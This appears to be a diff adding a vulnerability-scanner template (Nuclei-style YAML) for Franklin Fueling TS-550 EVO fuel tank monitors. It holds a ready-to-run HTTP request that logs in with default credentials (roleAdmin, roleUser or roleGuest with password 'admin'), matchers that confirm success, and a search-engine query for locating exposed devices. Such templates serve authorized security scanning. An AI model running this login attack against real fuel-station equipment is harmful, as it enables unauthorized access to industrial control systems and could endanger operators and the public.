@@ -1,0 +1,46 @@
+id: franklin-fueling-default-login
+
+info:
+  name: Franklin Fueling System - Default Login
+  author: r3Y3r53
+  severity: high
+  description: |
+    A default password vulnerability refers to a security flaw that arises when a system or device is shipped or set up with a pre-configured, default password that is commonly known or easily guessable.
+  reference:
+    - https://www.exploitalert.com/view-details.html?id=39466
+  classification:
+    cpe: cpe:2.3:o:franklinfueling:ts-550_evo_firmware:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: franklinfueling
+    product: ts-550_evo_firmware
+    google-query: inurl:"relay_status.html"
+  tags: default-login,franklin
+
+http:
+  - raw:
+      - |
+        POST /21408623/cgi-bin/tsaws.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <TSA_REQUEST_LIST PASSWORD="{{password}}"><TSA_REQUEST COMMAND="cmdWebCheckRole" ROLE="{{username}}"/></TSA_REQUEST_LIST>
+
+    attack: pitchfork
+    payloads:
+      username:
+        - roleAdmin
+        - roleUser
+        - roleGuest
+      password:
+        - admin
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "text/xml")'
+          - 'contains(body, "</TSA_RESPONSE_LIST>")'
+          - 'contains(body, "roleAdmin") || contains(body, "roleUser") || contains(body, "roleGuest")'
+        condition: and
+# digest: 4a0a004730450220185b7e78994ee2f5e5a6df68c2328e995d42ef272aaf25c7e5754b88a80eee05022100d7013db837efa4c490394cee69cad7887c67081f5824bdf7afc73266be1fb949:922c64590222798bb761d5b6d8e72950
